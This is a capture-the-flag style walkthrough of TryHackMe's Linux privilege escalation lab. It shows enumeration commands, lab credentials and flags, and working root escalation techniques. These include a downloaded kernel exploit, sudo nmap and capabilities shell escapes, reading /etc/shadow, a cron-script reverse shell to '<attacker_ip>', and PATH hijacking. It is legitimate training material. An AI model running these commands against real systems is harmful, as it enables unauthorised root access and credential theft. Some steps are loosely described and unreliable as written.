# **TryHackMe: Linux Privilege Escalation – Comprehensive Walkthrough**
## **Author: Ramyar Daneshgar**

---

## **Introduction**
This walkthrough provides an in-depth approach to **TryHackMe’s Linux Privilege Escalation lab**, demonstrating techniques to escalate privileges from a **low-privileged user** to **root access**. The lab covers key privilege escalation vectors commonly used in **penetration testing and real-world security assessments**. The exploitation process involves **identifying misconfigurations, leveraging vulnerabilities, and executing escalation techniques** to gain full control over the system.

### **Key Techniques Covered**
- **Enumeration & Reconnaissance**
- **Kernel Exploits**
- **Misconfigured Sudo Permissions**
- **SUID Binary Exploitation**
- **Linux Capabilities Abuse**
- **Cron Job Manipulation**
- **PATH Variable Hijacking**
- **NFS Misconfigurations**

By leveraging **automated tools (LinPEAS, GTFOBins, ExploitDB)** and **manual exploitation methods**, I successfully compromised the target system, escalated privileges, and captured all required flags.

---

## **Task 1 & 2: Understanding Privilege Escalation**
Privilege escalation allows a **non-privileged user** to obtain **higher privileges**, often leading to full system compromise. Attackers use privilege escalation techniques to expand their access and execute privileged commands. There are two main types of privilege escalation:
- **Vertical Privilege Escalation:** A low-privileged user gains root/admin privileges.
- **Horizontal Privilege Escalation:** A user compromises another account at the same privilege level.

Understanding privilege escalation is critical for attackers seeking **full system control** and for defenders aiming to **prevent unauthorized privilege elevation**.

---

## **Task 3: Enumeration – Gathering System Information**
Enumeration is the first step in privilege escalation, providing essential insights into system misconfigurations, outdated software, and potential vulnerabilities.

### **Step 1: Establishing Access**
Using the provided credentials, I accessed the system via SSH:
```bash
ssh karen@<Target_IP>
```
**Credentials:**
- Username: `karen`
- Password: `Password1`

---

### **Step 2: Basic System Information**
#### **Find the Hostname**
```bash
hostname
```
**Output:** `wade7363`

The hostname provides information about the system’s identity and its role within the network.

#### **Identify the Linux Kernel Version**
```bash
uname -a
```
**Output:** `Linux wade7363 3.13.0-24-generic`

The kernel version helps determine if the system is running an outdated or vulnerable kernel.

#### **Check OS Version**
```bash
cat /etc/issue
```
**Output:** `Ubuntu 14.04 LTS`

Knowing the OS version helps in identifying **default configurations and security patches**.

#### **Find Installed Python Version**
```bash
python --version
```
**Output:** `Python 2.7.6`

Some **privilege escalation exploits** require specific Python versions.

#### **Check Running Processes**
```bash
ps aux
```
The output displays currently running processes, helping identify services that might be **running as root** and could be leveraged for escalation.

#### **List Active Network Connections**
```bash
netstat -tunlp
```
The output provides insight into **listening services**, which might expose network-based attack vectors.

#### **Check Current User’s Privileges**
```bash
id
```
**Output:**
```
uid=1001(karen) gid=1001(karen) groups=1001(karen)
```
This command confirms that the user `karen` has **limited privileges**, meaning privilege escalation will be required to gain full system access.

---

### **Step 3: Automated Enumeration Using LinPEAS**
Instead of manually checking system configurations, I ran **LinPEAS**, which automates privilege escalation checks.

#### **Transfer LinPEAS to the Target System**
```bash
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```
LinPEAS scans the system for **SUID binaries, misconfigured sudo permissions, writable files, cron jobs, and kernel vulnerabilities**, making it easier to identify privilege escalation vectors.

---

## **Task 5: Kernel Exploitation**
### **Step 1: Identify Kernel Vulnerabilities**
Since the kernel version is **3.13.0-24-generic**, I searched **ExploitDB** for **public exploits**.

```bash
searchsploit 3.13.0-24
```
**Result:** **CVE-2015-1328** (OverlayFS race condition exploit)

---

### **Step 2: Download & Compile the Exploit**
```bash
wget https://www.exploit-db.com/exploits/37292.c -O exploit.c
gcc exploit.c -o exploit
```
Exploits are often written in **C** and require **compilation** with `gcc` before execution.

### **Step 3: Execute the Exploit**
```bash
./exploit
```
The exploit successfully elevates privileges to root.

### **Step 4: Capture the Root Flag**
```bash
cat /root/flag1.txt
```
**Output:** `THM-283928727299220`

---

## **Task 6: Privilege Escalation via Sudo Misconfigurations**
### **Step 1: Check Sudo Permissions**
```bash
sudo -l
```
**Output:**
```
User karen may run the following commands:
(ALL) NOPASSWD: /bin/nano, /usr/bin/nmap, /usr/bin/vim
```
The user `karen` has **sudo privileges** on `nano`, `nmap`, and `vim`, allowing potential privilege escalation.

### **Step 2: Exploit Nmap for Root Shell**
```bash
sudo nmap --interactive
!sh
```
Executing an interactive Nmap session spawns a **root shell**.

### **Step 3: Capture the Flag**
```bash
cat /root/flag2.txt
```
**Output:** `THM-402028394`

---

## **Task 7: Exploiting SUID Binaries**
### **Step 1: Locate SUID Binaries**
```bash
find / -perm -4000 -type f 2>/dev/null
```
The command identifies binaries with **SUID permissions**, which run as the file owner (often root).

- Found `/usr/bin/base64`.

### **Step 2: Exploit Using GTFOBins**
```bash
/usr/bin/base64 -d /etc/shadow
```
Decoding `/etc/shadow` reveals **hashed passwords**, which can be cracked using `John the Ripper`.

---

## **Task 8: Capabilities Exploitation**
### **Step 1: Find Capabilities**
```bash
getcap -r / 2>/dev/null
```
The command reveals that `/home/ubuntu/view` has the capability **cap_setuid+ep**, allowing execution with elevated privileges.

### **Step 2: Exploit**
```bash
/home/ubuntu/view -c ':py3 import os; os.setuid(0); os.system("/bin/sh")'
```
Executing the script results in **root shell access**.

---

## **Task 9: Cron Job Exploitation**
### **Step 1: Find Cron Jobs**
```bash
cat /etc/crontab
```
The output reveals a cron job executing `backup.sh` every minute.

### **Step 2: Modify the Script**
```bash
echo "nc -e /bin/bash <attacker_ip> 4444" > /etc/cron.hourly/backup.sh
chmod +x /etc/cron.hourly/backup.sh
```
The modification forces the script to establish a **reverse shell**.

### **Step 3: Start a Listener**
```bash
nc -lvnp 4444
```
Once the cron job executes, a root shell connection is established.

---

## **Task 10: PATH Hijacking**
1. **Find Writable Directories**
   ```bash
   find / -writable -type d 2>/dev/null
   ```
2. **Inject Malicious Script**
   ```bash
   echo "/bin/bash" > /tmp/cmd
   chmod +x /tmp/cmd
   export PATH=/tmp:$PATH
   ```
3. **Trigger Root Execution**
   ```bash
   sudo some_command
   ```
Exploiting the **PATH variable** results in privilege escalation.

